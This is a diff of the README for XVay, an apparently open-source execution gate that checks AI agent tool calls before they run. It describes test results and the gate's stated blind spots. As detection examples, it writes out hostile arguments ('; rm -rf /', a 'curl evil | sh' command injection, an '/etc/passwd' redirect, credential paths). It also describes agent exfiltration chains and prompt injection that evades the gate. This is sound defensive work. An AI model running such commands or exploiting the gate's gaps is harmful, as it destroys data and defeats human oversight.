@@ -1,245 +1,132 @@
-<p align="center"><b>XVAY</b></p>
-<h3 align="center">Your AI agent is one mistake away from production disaster.</h3>
-<p align="center">XVay stops irreversible actions before they execute.</p>
+# XVay — an execution gate for AI agents
 
----
+XVay decides whether an agent's tool call has **enough evidence to run, right
+now** — *before* it executes, from the request text alone, outside the model.
+It returns one of three verdicts:
 
-## Demo
+- **COMMIT** — enough evidence; let it run.
+- **VERIFY** — not enough evidence; a human should approve first.
+- **BLOCK** — the request contradicts something the operator explicitly declared.
 
+It is **not** a policy engine and does not decide what is "dangerous." The
+operator declares what matters (protected resources, egress tools, limits) in a
+signed envelope; XVay only measures whether the evidence for *this* action is
+sufficient. That separation is deliberate: XVay is auditable precisely because it
+never guesses intent.
 
-```text
-Agent:  Deleting production database...
+## Why it exists
 
-XVay:  ❌ BLOCKED
-        Production environment detected.
-        Operation is irreversible.
-        Human approval required.
-```
+Most agent guardrails run inside the model (promptable, bypassable) or require a
+heavy runtime that executes actions in a sandbox and rolls them back. XVay sits
+in between: a **pre-execution check** at the tool-dispatch boundary with
+near-zero integration and ~0.6 ms per call. No shadow filesystem, no effect
+outbox, no per-framework adapters, no code execution.
 
-*(demo GIF goes here — record from DEMO.html)*
+## What it catches (and what it does not)
 
-## What problem does XVay solve?
+XVay is honest about its threat model. It is strong at:
 
+- non-read actions on operator-declared protected resources → **BLOCK**
+- cross-step secret → declared-egress flows → **BLOCK**
+- shell-control / command-substitution injection into a non-shell tool argument
+  (`read_file` given `config.yaml > /etc/passwd`) → **VERIFY**
+- unbounded or oversized irreversible fan-out (`rm *.log`) → **VERIFY**
+- destructive verbs hidden in flags (`find . -delete`) → **VERIFY**
+- references to well-known credential paths (`.ssh/`, `.aws/credentials`) → **VERIFY**
 
-AI agents now execute real actions. The failure mode every team eventually
-hits: an irreversible action that shouldn't have run — the wrong database
-deleted, a code freeze broken, production touched from a staging task. The
-agent's "safety layer" today is a system prompt: advisory, not enforceable.
-XVay is the enforceable version — an approval layer outside the model.
-Three outcomes only: **COMMIT** (evidence sufficient) · **VERIFY** (evidence
-missing) · **BLOCK** (explicit contradiction, kept rare).
+It does **not** catch:
 
-## 30-second architecture
+- **Prompt injection that keeps the agent in-scope.** If an attack makes the
+  agent perform an *allowed* action with ordinary-looking arguments (e.g. a
+  money transfer to the wrong recipient), XVay has no structural signal to act
+  on. Measured on AgentDojo: ~2% of such attacks stopped with zero config, ~55%
+  with a protective config (see below). This is a design boundary, not a bug.
+- **Content lineage of undeclared secrets.** A log that happens to contain a key,
+  summarised and then sent out, requires tracking derived data through
+  execution — which XVay deliberately does not do.
 
+If your hard requirement is automatic rollback or data-flow lineage, XVay is the
+wrong tool.
 
-```text
-tool schema ──► connector (8 frameworks) ──► capability catalog
-run metadata ─► signed execution envelope ─► scope for THIS run
-                (Ed25519 — XVay holds only the PUBLIC key:
-                 it verifies permissions, it cannot forge them)
-catalog ∩ scope ──► normalizer (standardizes, never decides)
-                ──► gate ──► COMMIT / VERIFY / BLOCK + human-readable reason
-```
-
-Capability ≠ permission: `delete_database` in your schema doesn't make it
-allowed in a "read staging logs" run.
-
-## Install & run (shadow pilot — read-only, one command)
-
+## Install
 
 ```bash
-pip install -r requirements.txt   # pynacl only
-python3 xvay_shadow.py --framework mcp --schema tools.json \
-        --actions actions.jsonl --output report.html
+git clone https://github.com/<your-account>/xvay
+cd xvay
+pip install -r requirements.txt   # just pynacl, for envelope signing
 ```
 
-Shadow mode stops nothing; it replays your log and reports what enforcement
-WOULD have decided — headline: irreversible actions that would have executed.
-
-## Example output
-
-
-| action | decision | reason |
-|---|---|---|
-| `kubectl rollout restart staging-api` | ✅ COMMIT | fits declared scope |
-| `docker volume prune` | ◆ VERIFY | scope unclear, destructive |
-| `kubectl delete namespace production` | ❌ BLOCK | scope contradiction |
-
-Benchmark (reproducible: `python3 execution_gate.py`): 10/10 irreversible
-out-of-scope actions stopped · 0% false-block on safe actions · BLOCK rate 11%.
-
-
-## Real-time enforcement (not just shadow)
-
-
-Beyond the read-only shadow pilot, XVay can enforce live. `mcp_live_gate.py`
-intercepts an MCP `tools/call` BEFORE it reaches the tool and returns
-COMMIT / VERIFY / BLOCK in real time — COMMIT forwards, VERIFY/BLOCK stop the
-action and hand the reason back to the agent (so the agent itself can react).
-
-## Consequence preview (terraform-plan style)
-
-
-`plan.py` computes three facts from the action ALONE (zero connection to your
-systems): reversibility, scope, and environment — the way `terraform plan`
-shows what will change before `apply`. Every decision is self-explaining, so
-audit is automatic rather than manual, and the loop stays agentic.
-
-## Protected resources (you declare, XVay enforces)
-
-
-Declare sensitive resources in the signed envelope (e.g. `orders-primary`,
-`stripe-live`). Any NON-read action naming one is BLOCKed — even if the verb
-isn't an obvious destructive word. Reads pass. XVay never guesses what's
-sensitive; you declare it, so every block is auditable.
-
-
-## Cross-step protection (chains that look innocent step by step)
-
-
-A chain can be dangerous even when every step looks fine:
-`read customer-records` (safe) then `slack_post_message` (safe) = exfiltration.
-
-XVay keeps a lightweight per-run trace — a taint flag and an irreversible-action
-counter. It is **not** a transaction manager: no shadow execution, no effect
-outbox, no rollback. You declare the boundaries in the signed envelope:
+## Use
 
 ```python
-env_doc["run_id"]           = "run-1842"
-env_doc["egress_tools"]     = ["slack_post_message", "http_post"]
-env_doc["max_irreversible"] = 3
+import mcp_live_gate as gate
+from connectors import to_canonical
+
+catalog = to_canonical("openai", "agent_schema.json")   # your tools
+request = {"method": "tools/call",
+           "params": {"name": "read_file", "arguments": {"path": "config.yaml"}}}
+
+envelope = {                      # what the operator declares
+    "environment": ["staging"],
+    "protected_resources": ["orders-primary"],
+    "egress_tools": ["send_email", "curl"],
+}
+decision, reason, forward = gate.check(request, catalog,
+                                       task_scope="staging", envelope=envelope)
+print(decision, "-", reason)      # COMMIT / VERIFY / BLOCK
 ```
 
-- run read a protected resource, then calls an egress tool -> **BLOCK**
-- run exceeds the irreversible budget -> **VERIFY**
-- nothing declared -> behaviour identical to before
+For production the envelope should be **signed** (Ed25519); see
+`envelope_auth.py` and `samples/sample_envelope.json`.
 
-## Argument-level protection (on by default)
+## Run the tests
 
+Every claim above is checked by a test in this repo.
 
-Gating on tool names alone is not enough: `kubectl_logs` with the argument
-`; rm -rf /` is an allowed tool doing something else entirely. XVay inspects
-argument **structure** (never semantics) and downgrades COMMIT -> VERIFY on:
-shell control characters, `../` traversal, `$VAR` indirection, base64 that
-decodes to readable text, write/exfil clauses in a read-only tool's argument,
-and homoglyph scripts in path-like fields.
-
-Built-in credential locations (`/etc/shadow`, `.ssh/`, `.aws/credentials`, …)
-ship enabled so it works with zero configuration. They raise **VERIFY** (we
-suggest them); resources **you** declare raise **BLOCK** (you declared them).
-Opt out with `use_default_sensitive_paths=False`.
-
-Free-text argument keys (`message`, `text`, `title`, …) are prose, not
-executable content — a commit message saying "delete old module" does not trip
-the destructive-verb check, while `-m "fix && curl evil | sh"` still does.
-
-## Multi-worker deployments
-
-
-`run_trace` and the nonce replay-guard sit on a pluggable store (`store.py`)
-with an **atomic** update. In-memory by default; back it with a shared store
-(Redis/DB, or the bundled FileStore) and cross-step protection holds across
-workers. `multiprocess_test.py` proves it: two separate processes sharing a
-store block the exfiltration chain, the same two **without** the shared store
-leak (so the test is real), and 20 concurrent writers lose zero writes.
-
-## When a run is stopped midway
-
-
-XVay prevents; it does not roll back. If step 4 is blocked, the orchestrator
-needs to know what steps 1-3 did:
-
-```python
-run_trace.manifest(run_id)   # exactly what XVay COMMITted -> you compensate
-run_trace.receipt(run_id)    # audit: steps seen, committed, stopped WITH reasons
+```bash
+for t in execution_gate integration_benchmark protected_resource_benchmark \
+         evidence_benchmark multiprocess_test property_test \
+         adversarial_benchmark hard_test cordon_gap identity_test; do
+  echo "== $t =="; python3 $t.py
+done
 ```
-Stopped attempts are recorded, not silently dropped — a blocked exfiltration
-attempt is the most audit-relevant event in the run.
 
-## Adversarial evidence (including what failed)
+Notable ones:
 
+| test | what it proves |
+|---|---|
+| `property_test.py` | 245 generated spelling/transform cases; no dangerous action ever COMMITs, no benign one is ever stopped |
+| `adversarial_benchmark.py` | 38 hand-built attacks incl. shell-injection; 0 leaks, 0 friction |
+| `hard_test.py` | rules tested against real destructive-but-routine traffic (`rm -rf node_modules`, pipes) written to break them |
+| `identity_test.py` | 8 structural invariants over 4,896 inputs: the wrapper checks only ever downgrade COMMIT→VERIFY, never execute, never emit BLOCK |
+| `cordon_gap.py` | coverage of the five risk families from the Cordon paper (arXiv 2606.17573) |
+| `agentdojo_paired.py` | real third-party benchmark (`pip install agentdojo`); reports the honest ~2% / ~55% numbers above |
 
-`python adversarial_benchmark.py` — 38 cases written to break XVay:
-**38/38, safety leaks 0/14, friction 0/24**, including 10 "hard benign" cases
-designed to trip our own rules.
+## How it works (one paragraph)
 
-The number matters less than the path. The first run of this benchmark leaked
-**10 of 15** dangerous cases — `kubectl_logs` with `; rm -rf /` was COMMITted.
-Every fix since is a mechanical check, not a risk judgement. Two of our own
-false positives (a commit message containing "delete"; a Persian filename) are
-documented with their fixes.
+`execution_gate.py` is the frozen core: it answers the evidence question and
+nothing else. `gate_with_envelope.py` wraps it with operator-declared checks
+that can only **downgrade** a COMMIT to VERIFY — they never turn a VERIFY or
+BLOCK back into COMMIT, and never invent a BLOCK. `arg_check.py` inspects
+argument structure. `mcp_live_gate.py` is the live entry point for MCP
+`tools/call` interception. `connectors.py` / `schema_extractor.py` map various
+agent frameworks (OpenAI, MCP, LangGraph, CrewAI, AutoGen, OpenAPI, CLI) to one
+canonical form. The core's behaviour is pinned by md5 in the tests, so any change
+to it is loud.
 
-**Caveat we state out loud:** this is still *our* test set. The only number that
-should convince you is a shadow report on *your* logs.
+## Status
 
-## What XVay does not do (by design)
+This is a working reference implementation with a real test suite. It has **not**
+yet been validated in production against a paying user's traffic — that is the
+honest open question, and no benchmark answers it. Feedback from real agent
+deployments is the most useful contribution you can make.
 
-Every one of these is a trade, not an oversight. Each buys the thing XVay is
-built for: **prevention before execution, at near-zero integration cost.**
+## License
 
-**It does not roll back.**
-XVay prevents rather than repairs — nothing executes until it passes the gate.
-That is precisely why it installs as one call at your tool-dispatch point
-instead of requiring a shadow-state engine, an effect outbox and a recovery log.
-When a run is stopped midway, XVay hands your orchestrator the exact list of
-what it did commit (`run_trace.manifest`) so the system that owns state can
-compensate.
-*If automatic undo of partially-completed workflows is a hard requirement, a
-transactional runtime is the right tool and XVay is not. We would rather you
-learn that in the first meeting than six months in.*
+AGPL-3.0. If you run a modified version as a network service, you must make your
+modified source available to its users. If you want to use XVay in a closed
+commercial product, contact the author about a separate commercial license.
 
-**Its cross-step signal is coarse.**
-A per-run taint flag and an irreversible-action budget, not a lineage graph.
-It errs conservative: on a long run it can ask for approval on something that
-turned out to be fine. In exchange, it needs zero instrumentation of your
-runtime and no tracking of objects through your code.
-*Mitigation: scope `run_id` to a task rather than a whole session, and declare
-`egress_tools` narrowly.*
+## A note on the name
 
-**It cannot see danger that only appears at execution.**
-A payload that is encoded, or expressed in a domain language XVay does not
-parse (raw SQL, GraphQL), can look benign as a tool call. This is true of any
-pre-execution gate, including this one — a system that speculatively executes
-and validates effects can catch that class, and we say so plainly.
-*Mitigation: declare the sink as a protected resource, or gate at the data
-layer. XVay flags encoded and structurally anomalous arguments (`arg_check.py`),
-which raises the cost of this attack but does not eliminate it.*
-
-**It judges evidence, not policy.**
-XVay answers one question — "is there enough evidence to execute THIS action,
-right now?" It does not decide who is allowed to do what; that stays with your
-IAM/OPA. And it never guesses what is sensitive in your business: you declare
-it, which is why every block is explainable in one sentence.
-
-## Deployment requirement: shared state for multiple workers
-
-`run_trace` and the nonce replay-guard are per-process by default. If your
-agent's calls are served by more than one worker, back them with a shared store
-before relying on cross-step protection — otherwise a chain split across two
-processes will not be seen. `store.py` defines the interface (get/put/delete/
-keys/atomic update); a FileStore reference implementation ships with it, and
-`multiprocess_test.py` proves the guarantee holds across separate processes and
-that it does **not** hold without a shared store. Redis or your database is the
-production choice. It is a small swap, but it is real integration work and we
-would rather state it than have your security reviewer find it.
-
-## FAQ
-
-
-**Why not build this in-house?** The 11-line gate isn't the product. The
-product is knowing when a gate is *wrong*: calibrated thresholds on your own
-logs, measured false-friction, and our catalog of integrations measured to
-make agents worse (e.g., injecting evidence into prompts: −5%). The shadow
-report shows the delta on your own data in 30 minutes.
-
-**What does a pilot cost me?** One command, zero system changes, zero write
-access. Worst case you lose half an hour.
-
-**Does XVay decide what's allowed?** No — that's IAM/OPA's job. XVay answers
-one question: "is there enough evidence to execute this action, now?"
-
-**Has XVay prevented real incidents?** We don't claim past events. It is
-designed for the failure class seen in 2025–26 agent incidents; your shadow
-report is the evidence that matters.
-<!-- ==== APPEND THESE SECTIONS TO YOUR EXISTING README (before the FAQ) ==== -->
-
+Formerly developed under the name "Poker." XVay is the same execution-gate idea.
